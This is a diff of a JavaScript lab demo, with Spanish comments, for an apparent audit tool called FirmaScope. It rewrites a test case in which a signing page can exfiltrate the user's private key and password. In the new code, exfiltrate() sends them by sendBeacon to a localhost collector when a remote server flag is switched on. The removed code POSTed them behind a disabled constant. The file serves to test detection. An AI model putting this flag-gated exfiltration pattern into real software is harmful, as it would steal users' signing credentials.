@@ -1,56 +1,54 @@
 /*
- * demo-static-only — la ruta existe pero no se recorre.
+ * demo-static-only: el codigo puede exfiltrar, pero no lo hace hoy.
  *
- * En tiempo de ejecucion esta demo se comporta igual que demo-safe: firma
- * localmente y solo entrega la firma. Pero el codigo cargado contiene una
- * ruta completa desde el .key y la contrasena hasta `fetch`, que en esta
- * sesion no se ejecuta (esta tras una bandera de configuracion apagada).
+ * La ruta de exfiltracion existe, es completa y es alcanzable, pero esta tras
+ * una bandera que el servidor no activa en esta sesion. Es el patron del codigo
+ * de exfiltracion condicional: la pestana Network no muestra nada, y volver a
+ * mirar manana puede mostrar otra cosa.
  *
- * Es el caso que separa los niveles 1 y 2. Una auditoria que solo observe la
- * red concluye "no se observo transmision" — y estaria diciendo la verdad.
- * Solo el analisis estatico puede anadir: "pero el codigo puede hacerlo".
- *
- * Resultado esperado de la auditoria:
- *   FS-KEY-001 -> NOT_OBSERVED   (nada salio: es cierto)
- *   FS-CODE-001 -> POTENTIAL     (la ruta existe en el codigo cargado)
- *
- * Que ambos convivan en el mismo reporte es justamente lo que FirmaScope
- * debe saber expresar.
+ * Es la prueba del nivel 2. FirmaScope debe declarar FS-CODE-001 POTENTIAL con
+ * la ruta reconstruida y, a la vez, FS-KEY-001 NOT_OBSERVED. Las dos
+ * afirmaciones son ciertas y no se contradicen: la distincion entre "no lo
+ * observe" y "no puede ocurrir" es el proposito de la herramienta.
  */
 
-/* Bandera apagada: la rama de respaldo nunca se toma en esta sesion. */
-const REMOTE_BACKUP_ENABLED = false;
+let remoteFlags = { collectKeyMaterial: false };
 
-/*
- * Nunca se llama. El analizador estatico si la ve: lee el .key y la
- * contrasena del formulario y los envia.
- */
-async function respaldarCredenciales() {
-  const keyFile = document.getElementById('key-file').files[0];
-  const keyPassword = document.getElementById('password').value;
-  const keyBytes = await readFile(keyFile);
-
-  await fetch(collectorUrl('/collect/backup'), {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      keyFile: toBase64(keyBytes),
-      keyPassword: keyPassword
-    })
-  });
+async function loadFlags() {
+  try {
+    const response = await fetch('/api/flags');
+    remoteFlags = await response.json();
+  } catch (err) {
+    log('no se pudieron leer las banderas; se mantienen las locales');
+  }
 }
 
-labMain(async function (keyBytes, password, cerBytes) {
-  const loaded = await loadPrivateKey(keyBytes, password);
-  log('clave privada importada (no extraible)');
+/* Ruta de exfiltracion completa: source -> transform -> sink. */
+function exfiltrate(keyBytes, password) {
+  const payload = toBase64(keyBytes);
+  navigator.sendBeacon('http://localhost:8766/collect?p=' + encodeURIComponent(password),
+                       payload);
+}
 
-  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
-  log('documento firmado localmente (' + signature.byteLength + ' bytes)');
+labSetup({
+  onSign: async function (state, documentText) {
+    await loadFlags();
 
-  if (REMOTE_BACKUP_ENABLED) {
-    await respaldarCredenciales();
-  }
+    const keyBytes = await readFile(state.key);
+    const cerBytes = await readFile(state.cer);
 
-  await entregarFirma(signature, cerBytes);
-  setStatus('Firmado localmente. El codigo contiene una ruta de respaldo no ejecutada.', 'warn');
+    if (remoteFlags.collectKeyMaterial) {
+      exfiltrate(keyBytes, state.password);
+      log('bandera activa: material enviado');
+    } else {
+      log('bandera inactiva: no se envia material en esta sesion');
+    }
+
+    const loaded = await loadPrivateKey(keyBytes, state.password);
+    const signature = await signDocument(loaded.key, documentText);
+    log('firma generada: ' + signature.byteLength + ' bytes');
+
+    return { signature: signature, certificate: cerBytes };
+  },
+  onSubmit: labSubmitSignature
 });
